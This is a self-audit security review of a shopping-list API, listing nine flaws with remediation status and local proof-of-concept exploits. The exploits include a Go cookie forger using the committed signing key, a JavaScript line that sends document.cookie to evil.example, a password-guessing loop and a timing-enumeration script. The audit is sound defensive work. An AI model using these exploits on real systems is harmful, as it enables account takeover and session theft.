Security Review — sl-api

A self-audit of the shopping list API. Each finding includes a local, reproducible exploit so you can watch it work before deciding how to fix it.

Remediation status (updated 2026-09-28)

3 of 9 fixed, 4 planned, 2 open. Fixed #1 (password hashing, PR #8), #6 (login timing: constant-time comparison in PR #8, username-enumeration gap closed in PR #11), and #7 (per-IP login rate limiting, PR #13). Planned #2, #3, #4, and #9 are all covered by the merged Postgres-backed sessions design (docs/plans/postgres-sessions.html), not yet implemented. Open #5 and #8 are untouched. Per-finding status is marked below.

Scope and intent. This documents flaws in your own code, for you to run against your own local instance. The exploit steps assume the app is reachable at http://localhost:8080 and Postgres is the compose container sl-api-db-1. Do not point these at anything you do not own.

Setup used by the exploits below

Start the stack and create two accounts: an "attacker" you control and a "victim" you want to compromise.

# Terminal 1 — run the app against a fresh DB
docker compose up --build

# Terminal 2 — create the victim and the attacker
curl -s -X POST localhost:8080/v1/users \
  -d '{"name":"Vicky","lastName":"Victim","username":"victim","password":"sup3r-s3cret-pw"}'

curl -s -X POST localhost:8080/v1/users \
  -d '{"name":"Mal","lastName":"Attacker","username":"attacker","password":"whatever"}'

1. Passwords stored and compared in plaintext

CriticalFixed · PR #8
Fixed in PR #8. Registration now stores a bcrypt hash via Form.ToModel() (which returns an error and cannot produce a plaintext password), and login verifies with bcrypt.CompareHashAndPassword. Verified end to end: the DB now holds $2a$ hashes and login still succeeds. Existing plaintext rows can no longer log in and must be recreated. The exploit below no longer works.

Where: api/model/user/user.go — Form.ToModel() copies f.Password straight into the model, and ValidateCredentials does u.Password == form.Password. There is no hashing anywhere.

Why it matters: anyone who can read the database (a leaked backup, a SQL injection elsewhere, a curious DBA, or a compromised host) instantly has every user's real password — and because people reuse passwords, their accounts on other sites too. Passwords must be stored as a slow one-way hash (bcrypt, scrypt, or argon2id), never recoverable.

Exploit — read every password directly from the DB

docker exec -it sl-api-db-1 \
  psql -U shoppinglist_user -d shoppinglist_db \
  -c "SELECT username, password FROM users;"

You will see sup3r-s3cret-pw sitting in the password column in cleartext. A correct implementation would show something like $2a$10$N9qo8uLOickgx2ZMRZo... that cannot be reversed.

2. Session cookies are forgeable

CriticalPlanned
Planned. The Postgres-backed sessions design (docs/plans/postgres-sessions.html) replaces the signed identity cookie with an opaque server-side token, which removes the signing key entirely and eliminates forgery. Not implemented yet, so the exploit below still works.

Where: cmd/api/main.go creates the store with sessions.NewCookieStore([]byte(conf.StoreSessions.AuthSecret)), and the secret lives in the committed .env as AUTH_SESSION_STORE_SECRET=secretsecret.

Why it matters: the session cookie is a value signed with an HMAC keyed by that secret. The server trusts any cookie whose signature checks out. Because the key is (a) trivially weak and (b) published in your git history, anyone can mint a cookie that says user_id = <any victim> and the server will accept them as that user. This is a complete authentication bypass and full account takeover, with no password needed.

Exploit — forge a session for the victim

First get the victim's id (as an attacker you would harvest this from any endpoint that returns it, or just enumerate; here we read it straight from the DB for the demo):

docker exec -it sl-api-db-1 psql -U shoppinglist_user -d shoppinglist_db \
  -c "SELECT id, username FROM users WHERE username='victim';"

Now forge a cookie with the same library the server uses. Save as forge.go and run it with the victim id:

package main

import (
    "fmt"
    "github.com/gorilla/securecookie"
)

func main() {
    // the exact key the server trusts, straight from .env
    s := securecookie.New([]byte("secretsecret"), nil)

    // gorilla stores session.Values as map[interface{}]interface{}
    values := map[interface{}]interface{}{
        "user_id":  "<VICTIM-UUID-HERE>",
        "username": "victim",
    }

    encoded, err := s.Encode("auth-session", values)
    if err != nil { panic(err) }
    fmt.Printf("auth-session=%s\n", encoded)
}
go run forge.go
# -> auth-session=MTc0... (a long signed value)

# Use the forged cookie against an authenticated route, no login performed:
curl -s -b 'auth-session=MTc0...' localhost:8080/v1/products
curl -s -b 'auth-session=MTc0...' -X POST localhost:8080/v1/groups -d '{"name":"Owned"}'

The group is created owned by the victim. You are fully authenticated as them without ever knowing their password.

If Encode round-trips but the server rejects it: the gob-encoded value type must match. gorilla registers the map type on first real login, so if forging alone is finicky, log in as the attacker once first, then reuse the exact same process — the point stands: the key is known, so the signature is not a real defense.

3. Session cookie is signed but not encrypted

HighPlanned
Planned via the sessions design. The opaque token carries no identity, so there is nothing readable left in the cookie. Not implemented yet.

Where: same single-key NewCookieStore call. Passing one key gives you a hash (signing) key only; no block (encryption) key. gorilla therefore signs the cookie but leaves its contents in the clear.

Why it matters: everything you put in the session — here user_id and username — travels to the client readable. It leaks internal identifiers and confirms your session model to anyone who inspects a cookie. Sensitive session data should be encrypted, not just signed.

Exploit — read the session contents from your own cookie

curl -s -c cj.txt -X POST localhost:8080/v1/users/login \
  -d '{"username":"victim","password":"sup3r-s3cret-pw"}' >/dev/null

# The cookie value is base64; decoding it shows the plaintext gob with the UUID and username
grep auth-session cj.txt | awk '{print $NF}' | cut -d'|' -f1 2>/dev/null | base64 -d 2>/dev/null | strings
# Simpler: just look, the username and a UUID are visible in the decoded bytes
grep auth-session cj.txt | awk '{print $NF}' | base64 -d 2>/dev/null | strings

You will see the literal string victim and the user's UUID inside the decoded cookie. Nothing there is secret from the client.

4. Session cookie is not HttpOnly or Secure in debug mode

HighPlanned
Planned via the sessions design, which sets HttpOnly, Secure, and SameSite correctly and unconditionally in the new cookie code. Not implemented yet.

Where: api/routes/user/login.go sets HttpOnly: !a.isDebugging and Secure: !a.isDebugging, and your .env ships SERVER_DEBUG=true. So in the default dev configuration both protections are off.

Why it matters: HttpOnly=false means any JavaScript on the page can read the auth cookie, so a single reflected/stored XSS turns into session theft. Secure=false means the browser will send the cookie over plain HTTP, so anyone on the network path can sniff it. Debug-only toggles have a way of reaching production.

Exploit — steal the session from JavaScript

Because the cookie is not HttpOnly, this one line in a browser console (or injected via XSS) exfiltrates it:

// running in the browser context of the app
document.cookie
// -> "auth-session=MTc0...".  A real attacker would do:
new Image().src = "https://evil.example/steal?c=" + encodeURIComponent(document.cookie)

You can confirm the flag is missing without a browser: log in and look at the Set-Cookie header — there is no HttpOnly and no Secure attribute.

curl -si -X POST localhost:8080/v1/users/login \
  -d '{"username":"victim","password":"sup3r-s3cret-pw"}' | grep -i set-cookie

5. Secrets committed to the repository

HighOpen
Open. Deferred until a proper secret-storage strategy is in place (e.g. a cloud secret manager for deploys, gitignored .env plus a placeholder .env.example locally). Note the sessions design will remove the session secret, but the DB credentials in .env remain and still need rotating and untracking.

Where: .env is tracked in git and contains AUTH_SESSION_STORE_SECRET, DB_USER, and DB_PASS.

Why it matters: this is what makes finding #2 devastating rather than theoretical — the signing key is not just weak, it is public to anyone who can read the repo (and it stays in history even if you delete it later). The same applies to the database credentials.

Exploit — recover the secrets from history

git log -p -- .env | grep -iE 'secret|pass|user'
# every credential the project has ever used, printed from history
Because this secret is already public, treat it as burned: any real fix must also rotate it, not just move it out of the file.

6. Non-constant-time credential check and login timing side channel

MediumFixed
Fixed across two PRs. PR #8 switched the credential check to bcrypt.CompareHashAndPassword, which is constant time, so the byte-level password comparison no longer leaks. PR #11 closed the user-exists-vs-not-found gap: the not-found path now runs a throwaway bcrypt comparison against a decoy hash so both paths take comparable time. The dominant timing signal the exploit below relied on is gone (residual DB-level differences are far smaller and not a practical enumeration oracle).

Where: ValidateCredentials compares with ==, and login.go still carries the // TODO: Do something to avoid timing attacks. The not-found path returns right after the DB lookup; the found path does a DB lookup plus a password comparison.

Why it matters: Go's == on strings is not constant time, and the two login paths do measurably different amounts of work. An attacker who can time responses can tell "this username exists" from "it doesn't," which turns a blind guess into targeted enumeration. Credential comparisons should use crypto/subtle.ConstantTimeCompare (and, once passwords are hashed, bcrypt.CompareHashAndPassword, which is uniform by design).

Honest expectation for a local run: the byte-by-byte password timing leak is real in theory but hard to see here, because the database round trip dominates and Go compares word-at-a-time. The difference you can actually observe locally is user existence: the exists path does extra work. Run each many times and compare the medians — expect a small but repeatable gap, not a dramatic one.

Exploit — measure exists vs. does-not-exist

# existing user, wrong password
for i in $(seq 1 200); do
  curl -s -o /dev/null -w '%{time_total}\n' -X POST localhost:8080/v1/users/login \
    -d '{"username":"victim","password":"x"}'
done | sort -n | awk '{a[NR]=$1} END{print "median exists:    ", a[int(NR/2)]}'

# username that does not exist
for i in $(seq 1 200); do
  curl -s -o /dev/null -w '%{time_total}\n' -X POST localhost:8080/v1/users/login \
    -d '{"username":"nope-nobody","password":"x"}'
done | sort -n | awk '{a[NR]=$1} END{print "median missing:   ", a[int(NR/2)]}'

Locally, with no network jitter, the "exists" median should sit consistently a bit higher than "missing." That gap is the side channel.

7. No rate limiting or brute-force protection on login

MediumFixed
Fixed in PR #13. The login route now runs a per-IP rate limiter (go-chi/httprate, 10 attempts per minute) that returns a 429 in the standard error shape and sheds floods before they reach the bcrypt path. Counters are in memory (fine for a single instance). Per-account lockout for distributed brute force and limiting at other layers are follow-ups tracked in docs/plans/rate-limiting.html. The burst below now returns 429s instead of unlimited 401s.

Where: the router mounts /v1/users/login with no throttling, lockout, or backoff middleware.

Why it matters: combined with plaintext passwords (#1) and the timing oracle (#6), an attacker can guess passwords as fast as the server answers. There is nothing to slow them down.

Exploit — unthrottled password guessing

for pw in password 123456 qwerty letmein sup3r-s3cret-pw; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST localhost:8080/v1/users/login \
    -d "{\"username\":\"victim\",\"password\":\"$pw\"}")
  echo "$pw -> $code"
done
# 200 on the correct one, and the server never once refused to answer

All five attempts are served instantly; a real run would use a wordlist of millions.

8. IDOR: any authenticated user can read any user or product

LowOpen
Open. No ownership checks added yet. The exploit below still works.

Where: GET /v1/users/{id} and GET /v1/products/{id} check only that you are logged in, never that the record is yours.

Why it matters: once you hold any valid session, you can read other users' profiles by id. The password is not in the DTO, so this leaks profile data (name, username) rather than credentials, and the ids are UUIDs so they cannot be trivially counted up — which is why this is Low rather than High. It is still missing ownership authorization, and the pattern becomes dangerous the moment an endpoint returns something private.

Exploit — read another user through your own session

# log in as the attacker
curl -s -c mal.txt -X POST localhost:8080/v1/users/login \
  -d '{"username":"attacker","password":"whatever"}' >/dev/null

# grab the victim's id (in reality: leaked via an invite, a group listing, a referrer, etc.)
VID=$(docker exec -i sl-api-db-1 psql -tA -U shoppinglist_user -d shoppinglist_db \
  -c "SELECT id FROM users WHERE username='victim';")

# read the victim's profile with the attacker's cookie
curl -s -b mal.txt "localhost:8080/v1/users/$VID"

9. Context key uses a built-in string type

LowPlanned
Planned. Scheduled to be folded into the middleware rewrite in the sessions design (using an unexported key type). Not implemented yet.

Where: api/middleware/auth.go does context.WithValue(r.Context(), "user_id", userID) with a bare string key, read back with the same string.

Why it matters: this is the one flaw with no direct exploit, but it is a real hazard. Any other package that stashes a value under the string "user_id" in the same context silently collides with yours — last writer wins. In an auth path that can mean serving one user's request under another user's id. go vet flags this exact pattern. The fix is a private unexported key type, e.g. type ctxKey string used as ctxKey("user_id"), which cannot collide across packages.

How to see the risk

go vet ./api/middleware/
# SA1029-style warning: should not use built-in type string as key for value

No runtime exploit is included because triggering it requires a second package to write the same key; the point is that nothing structurally prevents it today.

Suggested order to address them

Password hashing (#1), the login timing side channel (#6), and login rate limiting (#7) are done. The next highest-impact step is implementing the session rewrite, which closes #2, #3, #4, and #9 together since they all live in the same store and cookie setup. Rotating and removing the committed secret (#5) should happen alongside it, and note the session rewrite removes the session secret but not the DB credentials. The IDOR item (#8) is a meaningful follow-up once the session work lands.
